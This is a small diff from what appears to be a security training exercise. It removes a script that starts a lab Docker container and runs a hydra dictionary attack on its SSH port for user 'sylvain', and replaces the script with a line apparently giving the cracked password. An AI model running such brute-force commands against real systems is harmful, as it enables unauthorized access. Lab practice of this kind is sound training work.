@@ -1,8 +1,1 @@
-#!/bin/bash
-
-# Pull and run the Docker image
-docker run -p 2222:22 -d -ti sylvainkalache/264-1
-
-# Run hydra to perform a dictionary attack
-hydra -l sylvain -P /path/to/password/dictionary.txt ssh://127.0.0.1:2222
-
+it is my password#
